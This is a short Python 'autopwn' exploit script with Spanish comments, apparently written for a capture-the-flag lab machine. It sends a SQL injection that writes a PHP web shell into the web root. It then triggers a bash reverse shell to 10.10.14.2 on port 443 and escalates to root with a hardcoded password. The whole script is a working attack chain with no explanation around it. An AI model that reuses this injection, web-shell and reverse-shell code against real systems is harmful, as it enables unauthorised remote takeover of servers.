#!/usr/bin/python3

from pwn import *
import signal, requests


def def_handler(sig, frame):
    print("\n\n [+] Saliendo ... \n")
    sys.exit(1)

# Ctrl+c
signal.signal(signal.SIGINT, def_handler)

# variables globales 
main_url = "http://10.10.11.116/"
lport = 443
if len (sys.argv) != 2:
    log.failure("Uso : python3 autopwn.py + nombre.php")
    sys.exit(1)
archivo = sys.argv[1]

def def_createfile():
    data_post = {
        'username' : 'caca',
        'country' : """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/%s"-- -""" % (archivo)
    }
    print("[+] Creando el archivo...")
    time.sleep(2)
    r = requests.post(main_url, data=data_post)

def def_reverse_shell():
    data_postt = {
        'cmd' : "bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'"
    }
    print("[+] Entablando la reverse shell...")
    time.sleep(2)
    rr = requests.post(main_url + "%s" % archivo, data=data_postt)
    
if __name__ == "__main__":
    def_createfile()
    try:
        threading.Thread(target=def_reverse_shell, args=()).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.sendline("su root")
    print("[+] Dale al enter cuando te aparezca el campo de password...")
    time.sleep(2)
    shell.sendline("uhc-9qual-global-pw")
    shell.sendline("")
    shell.interactive()
